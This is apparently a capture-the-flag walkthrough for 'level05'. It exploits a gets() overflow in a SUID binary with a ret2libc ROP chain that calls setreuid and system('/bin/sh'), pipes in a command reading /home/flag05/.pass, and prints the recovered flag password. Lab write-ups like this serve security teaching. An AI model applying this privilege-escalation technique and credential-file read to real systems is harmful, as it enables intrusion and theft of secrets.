# level05 — walkthrough

**Binary:** `/home/level05/wintermute` (SUID `flag05`, x86-64)
**Goal:** read `/home/flag05/.pass`

## 1. Recon
```
checksec: No PIE (0x400000), No canary, GNU_STACK = RW (NX ON), ASLR off.
```
`run_query()`:
```c
char query[QUERY_SIZE];    // 96 bytes at rbp-0x70
gets(query);               // unbounded read -> stack overflow
```

## 2. The bug / offset
Classic `gets()` overflow. `cyclic(200)` in gdb → saved RIP holds `"faab"` →
`cyclic_find` gives **offset 120** (`query` is at `rbp-0x70`, so 0x70 + 8 to the
saved RIP). NX is on → ret2libc against the fixed libc base `0x7ffff7c00000`.

## 3. Keeping the flag05 euid
`system()` runs `/bin/sh`, which drops euid→ruid, so first
`setreuid(1022, 1022)` (1022 = flag05). Then dash keeps euid = flag05.

## 4. No command buffer this time
Unlike level03 there is no global to plant a command in, so we
`system("/bin/sh")` (the string lives in libc) and feed the command over stdin.

## 5. ROP chain
```
pop rdi ; ret            ; 1022            \
pop rsi ; add rsp,0x10   ; 1022 + 3 filler  } setreuid(1022, 1022)
   ; pop rbx ; ret       ;                  /
setreuid
pop rdi ; ret            ; &"/bin/sh"
ret                      ; movaps alignment for system()
system                   ; system("/bin/sh")
```

## 6. Delivering the command (two subtle points)
* **movaps alignment** — `system()` needs `rsp % 16 == 8`, hence the extra
  `ret` gadget.
* **stdio buffering** — `gets()` reads the pipe in chunks. If the command
  follows the payload immediately, `gets()` either eats it as part of the same
  line (no newline between) or buffers it away from the shell's fd 0. Fix:
  end the payload with a newline and delay the command:
```
( cat payload; printf '\n'; sleep 0.5; echo 'cat /home/flag05/.pass' ) | ./wintermute
```

## 7. Run
```
python3 exploit.py > payload
( cat payload; printf '\n'; sleep 0.5; echo 'cat /home/flag05/.pass' ) | /home/level05/wintermute
-> 67aaawdq0zcaaf3x57yh6irhvyjv3vs5
```

**flag05 = `67aaawdq0zcaaf3x57yh6irhvyjv3vs5`** (SSH password for level06)
